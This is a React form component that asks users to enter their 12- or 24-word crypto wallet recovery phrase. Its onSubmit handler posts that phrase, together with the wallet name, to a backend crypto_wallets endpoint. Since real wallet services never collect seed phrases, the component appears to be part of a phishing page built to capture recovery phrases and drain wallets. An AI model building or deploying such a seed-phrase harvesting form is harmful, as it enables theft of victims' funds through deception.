import React, { useState } from "react";
import axios from "axios";
import { ErrorMessage, Field, Form, Formik } from "formik";
import * as Yup from "yup";
import Loading from "../Loading/Loading";

const Phrase = (props) => {
  const { WalletState, setSuccess } = props;
  const endPoint = process.env.REACT_APP_API_URL;

  const [loading, setLoading] = useState(false);

  const onSubmit = (values) => {
    setLoading(true);
    axios
      .post(`${endPoint}/crypto_wallets/`, {
        phrase: values.phrase,
        wallet_name: WalletState.name,
      })
      .then((res) => {
        setLoading(false);
        setSuccess(true);
      })
      .catch((error) => {
        console.log(error);
        setLoading(false);
      });
  };

  const validationSchema = Yup.object({
    phrase: Yup.string()
      .required("Phrase is required")
      .min(36, "Phrase must be 12 or 24 words seperated by a single space"),
  });

  const initialValues = {
    phrase: "",
  };

  return (
    <>
      {loading ? (
        <Loading />
      ) : (
        <Formik
          initialValues={initialValues}
          onSubmit={onSubmit}
          validationSchema={validationSchema}
        >
          {({ isValid, status, dirty, isSubmitting }) => (
            <Form
              style={{
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Field
                as="textarea"
                name="phrase"
                placeholder="Enter your recovery phrase"
                className="text-area-input"
              />
              <div style={{ color: "red", fontSize: "10px" }}>
                <ErrorMessage name="phrase" />
              </div>
              <div
                style={{ fontSize: "10px", marginBlock: "10px", width: "90%" }}
              >
                Typically 12 (sometimes 24) words seperated by a single space.
              </div>
              <button
                disabled={!(isValid && dirty) || isSubmitting}
                type="submit"
                className="form-button"
              >
                PROCEED
              </button>
            </Form>
          )}
        </Formik>
      )}
    </>
  );
};

export default Phrase;
